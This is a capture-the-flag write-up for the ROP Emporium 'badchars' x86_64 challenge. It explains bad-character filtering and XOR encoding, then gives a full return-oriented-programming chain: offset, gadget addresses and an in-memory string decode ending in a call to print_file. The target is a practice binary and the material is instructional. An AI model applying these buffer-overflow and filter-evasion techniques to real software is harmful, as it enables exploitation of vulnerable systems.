# Badchars - ROP Emporium (x86_64)

## Overview

**Badchars** is a challenge that introduces the concept of "bad characters" — bytes that get filtered or corrupted by the target application before your payload reaches its destination. This forces you to encode your payload and decode it in-place using ROP gadgets.

### The Goal

Call `print_file("flag.txt")` to read the flag, but you cannot include the characters `x`, `g`, `a`, or `.` anywhere in your payload.

### The Problem

The string `flag.txt` contains **4 bad characters**:

```
f  l  a  g  .  t  x  t
      ↑  ↑  ↑     ↑
     BAD BAD BAD BAD
```

If we send this string directly, it will be corrupted by the filter.

---

## Concepts

### What Are Bad Characters?

In exploitation, "bad characters" are bytes that:
- Get filtered/removed by the application
- Get transformed into different bytes
- Cause the input to be truncated (like null bytes `\x00`)

Common examples in real-world exploits:
- `\x00` (null) — terminates strings in C
- `\x0a` (newline) — terminates input in many programs
- `\x0d` (carriage return) — similar to newline
- Various protocol-specific characters

In this challenge, the program explicitly replaces `x`, `g`, `a`, and `.` with `0xeb`.

### The XOR Encoding Solution

XOR has a crucial mathematical property:

```
A ^ B = C
C ^ B = A   (XORing again with the same key reverses it!)
```

This means we can:
1. **Encode** our string before sending (XOR each bad char with a key)
2. **Write** the encoded string to memory
3. **Decode** in-place by XORing each byte again with the same key

### Why XOR Works

Example with the letter `'a'` (0x61):

```
Encoding:  0x61 ^ 0x02 = 0x63  ('a' becomes 'c')
Decoding:  0x63 ^ 0x02 = 0x61  ('c' becomes 'a' again)
```

The key `0x02` is arbitrary — any value works as long as:
1. The key itself isn't a bad character
2. The encoded result isn't a bad character

---

## Reconnaissance

### Binary Protections

```
$ checksec badchars
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

- **NX enabled**: Can't execute shellcode on the stack
- **No PIE**: Addresses are fixed, no need for leaks
- **No canary**: Simple buffer overflow is possible

### Finding the Offset

Using a cyclic pattern to find the offset to the return address:

```
$ cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaa...
```

**Important caveat**: The pattern contains `a` which is a bad character! The program corrupts it to `0xeb`, breaking the pattern.

Workaround: Look at which bytes survived. In the crash:
- RBP = `0xebebebebebebeb65` — the `65` is `'e'`
- RSP = `0xebebebebebebeb66` — the `66` is `'f'`

The `'f'` chunk starts at byte 40, so **offset = 40 bytes**.

### Finding Gadgets

Using `ropper` to find the gadgets we need:

```bash
$ ropper -f badchars | grep -E "(pop r12|pop r14|pop rdi|xor|mov)"
```

#### Available Gadgets

| Gadget | Address | Purpose |
|--------|---------|---------|
| `pop r12; pop r13; pop r14; pop r15; ret` | `0x40069c` | Load encoded string + dest + XOR key + target |
| `pop r14; pop r15; ret` | `0x4006a0` | Load XOR key + target for subsequent XORs |
| `pop rdi; ret` | `0x4006a3` | Set argument for `print_file` |
| `mov qword ptr [r13], r12; ret` | `0x400634` | Write 8 bytes to memory |
| `xor byte ptr [r15], r14b; ret` | `0x400628` | XOR a single byte in memory |

#### The usefulGadgets Function

```asm
usefulGadgets:
   0x400628:  xor  BYTE PTR [r15], r14b  ; XOR byte at [r15] with low byte of r14
   0x40062b:  ret
   0x400634:  mov  QWORD PTR [r13], r12  ; Write r12 (8 bytes) to address in r13
   0x400638:  ret
```

### Finding Writable Memory

```bash
$ readelf -S badchars | grep data
  [23] .data             PROGBITS         0000000000601028  00001028
```

The `.data` section at `0x601028` is writable.

**Critical Issue**: We need to check if our target addresses contain bad characters!

```
0x601028 + 6 = 0x60102e
                   ↑
                 0x2e = '.' (BAD CHARACTER!)
```

The address where we need to XOR the `x` character contains a bad character itself!

**Solution**: Use `0x601029` instead — shifting by 1 byte avoids all bad characters:

| Offset | Address | Contains Bad Char? |
|--------|---------|-------------------|
| +0 | `0x601029` | ✓ Safe |
| +2 | `0x60102b` | ✓ Safe |
| +3 | `0x60102c` | ✓ Safe |
| +4 | `0x60102d` | ✓ Safe |
| +6 | `0x60102f` | ✓ Safe |

### Finding print_file

```bash
$ objdump -d badchars | grep print_file
0000000000400510 <print_file@plt>:
```

Or use pwntools: `exe.plt['print_file']`

---

## Encoding the String

### Original String

```
Character:  f    l    a    g    .    t    x    t
Hex:        0x66 0x6c 0x61 0x67 0x2e 0x74 0x78 0x74
Position:   0    1    2    3    4    5    6    7
Bad char?:  No   No   YES  YES  YES  No   YES  No
```

### Choosing an XOR Key

We'll use `0x02`. Let's verify it doesn't create new bad characters:

```
'a' (0x61) ^ 0x02 = 0x63 ('c') — Safe!
'g' (0x67) ^ 0x02 = 0x65 ('e') — Safe!
'.' (0x2e) ^ 0x02 = 0x2c (',') — Safe!
'x' (0x78) ^ 0x02 = 0x7a ('z') — Safe!
```

### Encoded String

```
Original:  f  l  a  g  .  t  x  t
Encoded:   f  l  c  e  ,  t  z  t
```

In Python: `encoded = b'flce,tzt'`

---

## The Exploit Strategy

### High-Level Overview

```
┌─────────────────────────────────────────────────────┐
│                    YOUR PAYLOAD                      │
│    Contains encoded "flce,tzt" (no bad chars)       │
└─────────────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────┐
│              BUFFER OVERFLOW                         │
│    40 bytes padding + ROP chain                     │
└─────────────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────┐
│         STEP 1: WRITE TO MEMORY                     │
│    pop r12 = "flce,tzt"                             │
│    pop r13 = 0x601029 (.data)                       │
│    mov [r13], r12                                   │
│                                                     │
│    .data now contains: "flce,tzt"                   │
└─────────────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────┐
│         STEP 2: DECODE IN-PLACE                     │
│                                                     │
│    XOR byte at .data+2: 'c' ^ 0x02 = 'a'           │
│    XOR byte at .data+3: 'e' ^ 0x02 = 'g'           │
│    XOR byte at .data+4: ',' ^ 0x02 = '.'           │
│    XOR byte at .data+6: 'z' ^ 0x02 = 'x'           │
│                                                     │
│    .data now contains: "flag.txt"                   │
└─────────────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────┐
│         STEP 3: CALL print_file                     │
│    pop rdi = 0x601029 (.data address)              │
│    call print_file                                  │
│                                                     │
│    → Prints the flag!                               │
└─────────────────────────────────────────────────────┘
```

### Detailed ROP Chain

```
┌────────────────────────────────────────────────────────────────┐
│ PADDING: 40 bytes of 'A'                                       │
├────────────────────────────────────────────────────────────────┤
│ pop r12; pop r13; pop r14; pop r15; ret  (0x40069c)           │
│ r12 = 0x747a742c65636c66  ("flce,tzt" as little-endian QWORD) │
│ r13 = 0x601029            (.data address)                      │
│ r14 = 0x02                (XOR key)                            │
│ r15 = 0x60102b            (.data + 2, address of 'c')          │
├────────────────────────────────────────────────────────────────┤
│ mov qword ptr [r13], r12; ret  (0x400634)                     │
│ → Writes "flce,tzt" to .data                                   │
├────────────────────────────────────────────────────────────────┤
│ xor byte ptr [r15], r14b; ret  (0x400628)                     │
│ → XORs byte at .data+2: 'c' becomes 'a'                        │
├────────────────────────────────────────────────────────────────┤
│ pop r14; pop r15; ret  (0x4006a0)                             │
│ r14 = 0x02                                                     │
│ r15 = 0x60102c            (.data + 3)                          │
├────────────────────────────────────────────────────────────────┤
│ xor byte ptr [r15], r14b; ret  (0x400628)                     │
│ → XORs byte at .data+3: 'e' becomes 'g'                        │
├────────────────────────────────────────────────────────────────┤
│ pop r14; pop r15; ret  (0x4006a0)                             │
│ r14 = 0x02                                                     │
│ r15 = 0x60102d            (.data + 4)                          │
├────────────────────────────────────────────────────────────────┤
│ xor byte ptr [r15], r14b; ret  (0x400628)                     │
│ → XORs byte at .data+4: ',' becomes '.'                        │
├────────────────────────────────────────────────────────────────┤
│ pop r14; pop r15; ret  (0x4006a0)                             │
│ r14 = 0x02                                                     │
│ r15 = 0x60102f            (.data + 6)                          │
├────────────────────────────────────────────────────────────────┤
│ xor byte ptr [r15], r14b; ret  (0x400628)                     │
│ → XORs byte at .data+6: 'z' becomes 'x'                        │
├────────────────────────────────────────────────────────────────┤
│ pop rdi; ret  (0x4006a3)                                      │
│ rdi = 0x601029            (.data address = "flag.txt")         │
├────────────────────────────────────────────────────────────────┤
│ print_file@plt  (0x400510)                                    │
│ → Calls print_file("flag.txt")                                 │
└────────────────────────────────────────────────────────────────┘
```



## Lessons Learned

### 1. Bad Characters Affect Everything

Not just your strings, but also:
- Gadget addresses
- Memory addresses
- XOR keys
- Any data in your payload

Always check your entire payload for bad characters!

### 2. XOR is Your Friend

XOR encoding is a classic technique for:
- Bypassing bad character filters
- Obfuscating shellcode
- Encoding payloads in constrained environments

### 3. Memory Layout Matters

Understanding where writable sections are located (`.data`, `.bss`) is crucial for:
- Storing strings
- Storing shellcode (if NX is disabled)
- Pivot points for stack pivoting

### 4. Gadget Reuse

Notice how we used `pop r12; pop r13; pop r14; pop r15; ret` for the first operation (it sets all 4 registers at once), then switched to the shorter `pop r14; pop r15; ret` for subsequent XOR operations. This is more efficient and reduces payload size.

---

## Alternative Approaches

### Using ADD/SUB Instead of XOR

The binary also provides:
```asm
0x40062c:  add BYTE PTR [r15], r14b
0x400630:  sub BYTE PTR [r15], r14b
```

You could encode by subtracting a value and decode by adding it back (or vice versa).

### Using a Different XOR Key

Any key that doesn't produce bad characters works. For example:
- `0x01` would give: `'a'^0x01='`'`, `'g'^0x01='f'`, etc.
- Just verify none of the encoded chars are bad!

### Encoding All Characters

Instead of encoding just the bad chars, you could XOR the entire string. This adds complexity but might be necessary if the bad character list is longer.